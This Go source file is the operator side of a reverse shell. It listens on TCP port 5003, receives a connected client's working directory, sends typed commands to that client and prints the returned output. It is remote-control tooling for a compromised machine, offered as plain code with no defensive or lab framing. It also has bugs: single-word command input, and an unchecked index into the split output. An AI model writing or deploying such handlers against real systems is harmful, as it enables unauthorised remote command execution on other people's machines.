package main

import (
	"net"
	"fmt"
	"strings"
)

const (
	SERVER_HOST = "0.0.0.0"
	SERVER_PORT = "5003"
	BUFFER_SIZE = 128 * 1024
	SEPARATOR = "<sep>"
)

func main() {
	// create a socket object
	ln, err := net.Listen("tcp", SERVER_HOST+":"+SERVER_PORT)
	if err != nil {
		fmt.Println("Error creating listener:", err)
		return
	}
	
	defer ln.Close()
	fmt.Println("Listening as", SERVER_HOST+":"+SERVER_PORT, "...")

	// accept any connections attempted
	conn, err := ln.Accept()
	if err != nil {
		fmt.Println("Error accepting connection:", err)
		return
	}
	defer conn.Close()
	fmt.Println("Connected!")

	// receiving the current working directory of the client
	buf := make([]byte, BUFFER_SIZE)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading from connection:", err)
		return
	}
	cwd := string(buf[:n])
	fmt.Println("[+] Current working directory:", cwd)

	for {
		// get the command from prompt
		var command string
		fmt.Print(cwd + " $> ")
		fmt.Scan(&command)
		if command == "" {
			// empty command
			continue
		}
		// send the command to the client
		_, err := conn.Write([]byte(command))
		if err != nil {
			fmt.Println("Error sending command to client:", err)
			break
		}
		if strings.ToLower(command) == "exit" {
			// if the command is exit, just break out of the loop
			break
		}
		// retrieve command results
		buf := make([]byte, BUFFER_SIZE)
		n, err := conn.Read(buf)
		if err != nil {
			fmt.Println("Error reading from connection:", err)
			break
		}
		output := string(buf[:n])
		// split command output and current directory
		results := strings.Split(output, SEPARATOR)
		// print output
		fmt.Println(results[0])
		cwd = results[1]
	}
}